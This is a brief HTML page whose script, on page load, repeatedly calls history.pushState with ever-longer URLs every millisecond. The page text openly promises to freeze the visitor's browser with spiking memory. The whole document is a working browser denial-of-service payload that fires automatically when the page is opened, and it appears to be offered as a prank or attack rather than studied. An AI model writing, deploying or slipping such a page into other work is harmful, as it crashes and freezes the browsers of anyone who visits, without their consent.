<!DOCTYPE html>
<html>
<head>
<script> 

	function bomb_url() {
	  var total = "";
	  for( var i = 0; i < 10000; i++ ) {
	    total = total + i.toString();
	    history.pushState(0,0, total);
	  }
	}

	function intervalCall() {
	  setInterval(function(){ 
	    bomb_url(); }, 1);
	}

</script>
</head>

<body onload="intervalCall()" style="background:#00000">

<div>
	<p> Sit back and relax 5 to 10 sec, you browser will be freezed with spiking memory!</p>
</div>

</body>
</html>
